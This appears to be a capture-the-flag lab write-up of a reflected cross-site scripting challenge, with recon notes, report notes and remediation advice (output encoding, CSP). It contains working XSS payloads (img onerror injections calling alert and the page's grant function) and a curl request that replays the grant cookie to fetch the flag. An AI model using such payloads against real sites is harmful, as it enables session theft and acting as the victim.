# xss1 (Lab recipes) - reflected XSS

| | |
|---|---|
| **Challenge** | xss1 (Lab recipes) |
| **Category** | web (xss) |
| **Points / Difficulty** | 100 / introductory |
| **Target** | http://xss1.chal.deti:8021 (tested locally on 127.0.0.1:8021) |
| **Bug** | CWE-79 - reflected cross-site scripting |

## Hint
> The search box repeats what you type to everyone who looks.

## Recon (black-box)
- Search form `GET /?q=<term>`. The term is reflected **twice**: into the input's
  `value="..."` attribute **and raw** into the "Results for …" `<div class="q">`.
- The `<div>` reflection is unescaped HTML → markup injected there executes.
- Confirmed by probing: `?q=ZZprobe99ZZ` appears raw in the results div;
  `?q=<img src=x onerror=alert(document.domain)>` fires an alert; `<script>` runs too.
- `GET /flag` on its own → **404** (not granted). The delivered page ships a
  helper in its `<script>`:
  `function grant(){document.cookie='xss_grant_xss1=1;path=/';location.href='/flag';}`
  → the flag is granted to any browser whose script runs `grant()`.

## Approach
Inject HTML into the unescaped results div that triggers `grant()` client-side.
An `<img>` with a broken `src` runs its `onerror` without needing `<script>`:

```
?q=<img src=x onerror=grant()>
```
`grant()` sets `xss_grant_xss1=1` and redirects to `/flag`, which returns the flag
for any request carrying that cookie.

## Exploitation
```
# in a browser (the real reflected-XSS demonstration):
http://xss1.chal.deti:8021/?q=<img src=x onerror=grant()>

# curl equivalent (replicates what grant() does - set cookie, hit /flag):
curl -s --cookie "xss_grant_xss1=1" http://xss1.chal.deti:8021/flag
```

## Flag
```
flag{xss1_local_verify}   # local deployment placeholder; per-student on the real instance
```

## For the report
- **Class/confirm:** CWE-79 reflected XSS; confirmed with a minimal test
  (marker reflected raw, then `onerror=alert(document.domain)`), not a lucky payload.
- **Why `<img onerror>`:** no `<script>` needed and it survives most contexts; it
  calls the page's own `grant()` so no external script/host is required.
- **Impact:** arbitrary JS in a victim's session on this origin → here it claims
  the `/flag` grant; in general it steals sessions/acts as the victim.
- **Fix:** context-aware output encoding of `q` on the server (HTML-escape before
  interpolation; encode for attribute context in the `value=`); a strict CSP
  (`script-src` without inline) as defense-in-depth. Never reflect user input into
  HTML raw.

## Root cause & remediation
- **Cause:** `q` interpolated into the HTML response without escaping (CWE-79).
- **Fix:** output-encode per context + CSP; the `/flag` grant pattern shows why
  "it's just a search box" still yields full client-side code execution.
